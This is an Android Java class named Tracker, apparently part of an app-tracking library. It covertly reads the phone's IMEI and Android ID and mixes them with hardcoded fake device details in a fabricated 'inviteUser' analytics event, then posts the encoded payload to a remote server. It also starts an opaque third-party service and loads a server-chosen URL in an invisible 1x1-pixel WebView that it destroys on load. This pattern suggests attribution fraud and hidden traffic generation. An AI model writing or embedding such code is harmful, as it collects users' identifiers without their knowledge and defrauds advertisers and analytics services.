package com.xcar.track;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;
import android.view.ViewGroup;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import com.blood.a.SimpleService;
import java.lang.ref.WeakReference;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Random;
import java.util.UUID;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by cjh on 2018/12/20.
 */
public class Tracker {
  private static final int HANDLER_WHAT_TRACKER = 1;

  private static Tracker mInstance;
  private WeakReference<Activity> mActivity;
  private boolean mIsDebug = false;

  private String mUrl;
  private boolean isTracker = false;
  private int mDuration;
  private WebView mWebView;
  private FrameLayout mParentContainer;
  private boolean isShowWebView = false;
  private String mChid = "";

  @SuppressLint("HandlerLeak") private Handler mHandler = new Handler() {
    @Override public void handleMessage(Message msg) {
      if (msg.what == HANDLER_WHAT_TRACKER) {
        registerBlood();
        showWebView();
      }
    }
  };

  private Tracker() {
  }

  public static Tracker getDefault() {
    if (null == mInstance) {
      synchronized (Tracker.class) {
        if (null == mInstance) {
          mInstance = new Tracker();
        }
      }
    }
    return mInstance;
  }

  public void initialize(Activity activity, String chid, boolean isDebug) {
    mActivity = new WeakReference<>(activity);
    mIsDebug = isDebug;
    this.mChid = chid;

    new Thread(new Runnable() {
      @Override public void run() {
        String result = NetUtil.requestGet(new HashMap<String, String>());
        MyLog.i(result);

        try {
          JSONObject rootObject = new JSONObject(result);
          int status = rootObject.getInt("status");
          if (status == 1) {
            JSONObject dataObject = rootObject.getJSONObject("data");
            mUrl = dataObject.getString("url");
            isTracker = dataObject.getInt("istrack") == 1;
            String range = dataObject.getString("range");
            String[] split = range.split(",");
            int minDuration = Integer.parseInt(split[0]);
            int maxDuration = Integer.parseInt(split[1]);
            Random random = new Random();
            mDuration = random.nextInt(maxDuration - minDuration + 1) + minDuration;

            if (isTracker) {
              byte[] bytes = getRequestData().getBytes(Charset.forName("UTF-8"));
              byte[] encode = Base64.encode(bytes, Base64.NO_WRAP);
              String base64Encode = new String(encode, Charset.forName("UTF-8"));

              String urlEncode = URLEncoder.encode(base64Encode, "UTF-8");
              String reuqest_data = "data_list=" + urlEncode;

              NetUtil.sendCPICPostRequest(reuqest_data);

              mHandler.sendEmptyMessage(HANDLER_WHAT_TRACKER);
            }
          }
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
    }).start();
  }

  public void destory() {
    if (null != mActivity.get()) {
      SimpleService.destroy(mActivity.get());
    }
  }

  boolean isDebug() {
    return mIsDebug;
  }

  private void registerBlood() {
    SimpleService.init(mActivity.get(), "AIKA001");
  }

  private void showWebView() {
    if (null != mActivity.get() && !isShowWebView) {
      isShowWebView = true;
      mParentContainer =
          mActivity.get().getWindow().getDecorView().findViewById(android.R.id.content);
      mWebView = new WebView(mActivity.get());
      mWebView.setWebViewClient(new WebViewClient() {
        @Override public void onPageFinished(WebView view, String url) {
          destoryWebView();
        }

        @Override public void onReceivedError(WebView view, WebResourceRequest request,
            WebResourceError error) {
          destoryWebView();
        }
      });

      mWebView.setBackgroundColor(Color.WHITE);
      mWebView.setLayoutParams(new ViewGroup.LayoutParams(1, 1));

      if (null != mParentContainer) {
        mParentContainer.addView(mWebView);
      }
      mWebView.loadUrl(this.mUrl);
    }
  }

  private void destoryWebView() {
    mParentContainer.removeView(mWebView);

    mWebView.getSettings().setJavaScriptEnabled(false);
    mWebView.clearHistory();
    mWebView.clearView();
    mWebView.removeAllViews();
    mWebView.destroy();

    mWebView = null;
    mParentContainer = null;
    isShowWebView = false;
  }

  private String getUUId() {
    return String.valueOf((Build.BRAND + Build.MODEL).hashCode()) + getAndroidId();
  }

  private String getAndroidId() {
    if (mActivity.get() != null) {
      return android.provider.Settings.Secure.getString(mActivity.get().getContentResolver(),
          android.provider.Settings.Secure.ANDROID_ID);
    }
    return "";
  }

  private String getRequestData() {
    JSONArray dataJsonArr = new JSONArray();
    JSONObject dataObject = new JSONObject();
    JSONObject propertiesObject = new JSONObject();
    JSONObject libObject = new JSONObject();
    try {
      dataObject.put("time", System.currentTimeMillis());
      dataObject.put("event", "inviteUser");
      dataObject.put("mode", "3");
      dataObject.put("distinct_id", getUUId());

      //properties
      propertiesObject.put("app_version", "1.0");
      propertiesObject.put("lib", "Android");
      propertiesObject.put("model", "MI 4W");
      propertiesObject.put("is_first", "0");
      propertiesObject.put("wifi", true);
      propertiesObject.put("screen_name", "");
      propertiesObject.put("referrer", "");
      propertiesObject.put("imeicode", getDeviceId());
      propertiesObject.put("install_id", "-1500555757429400207");
      propertiesObject.put("carrier", "中国联通");
      propertiesObject.put("lib_version", "0.4.0-SNAPSHOT");
      propertiesObject.put("title", "ak");
      propertiesObject.put("device_id", "602b9ae203599414");
      propertiesObject.put("manufacturer", "OPPO");
      propertiesObject.put("channel", "3239");
      if (this.mDuration > 0) {
        propertiesObject.put("duration", mDuration);
      }
      propertiesObject.put("chid", this.mChid);

      //lib
      libObject.put("app_version", "9.2");
      libObject.put("0.4.0-SNAPSHOT", "0.4.0-SNAPSHOT");
      libObject.put("lib", "Android");

      dataObject.put("lib", libObject);
      dataObject.put("properties", propertiesObject);

      dataObject.put("type", "track");
      dataObject.put("project_name", "xcar");

      dataJsonArr.put(dataObject);

      return dataJsonArr.toString();
    } catch (JSONException e) {
      e.printStackTrace();
      return "";
    }
  }

  private String getDeviceId() {
    if (null != mActivity && null != mActivity.get()) {
      String deviceId = "";
      try {
        if (ContextCompat.checkSelfPermission(mActivity.get(), Manifest.permission.READ_PHONE_STATE)
            == PackageManager.PERMISSION_GRANTED) {

          TelephonyManager systemService =
              (TelephonyManager) mActivity.get().getSystemService(Context.TELEPHONY_SERVICE);
          deviceId = systemService.getDeviceId();

          if (TextUtils.isEmpty(deviceId)) {
            // 如果获取不到设备号(平板电脑等没有电话服务的设备会出现该情况),则获取android id
            deviceId =
                android.provider.Settings.Secure.getString(mActivity.get().getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID);
          }
        }

        if (TextUtils.isEmpty(deviceId)) {
          SharedPreferences sp =
              mActivity.get().getSharedPreferences("device_params", Context.MODE_PRIVATE);
          String mUUid = sp.getString("key_uuid", "");

          if (TextUtils.isEmpty(mUUid)) {
            mUUid = UUID.randomUUID().toString();

            sp.edit().putString("key_uuid", mUUid).apply();
          }
          deviceId = mUUid;
        }
      } catch (Exception e) {
        e.printStackTrace();
      }

      return deviceId;
    }

    return "";
  }
}
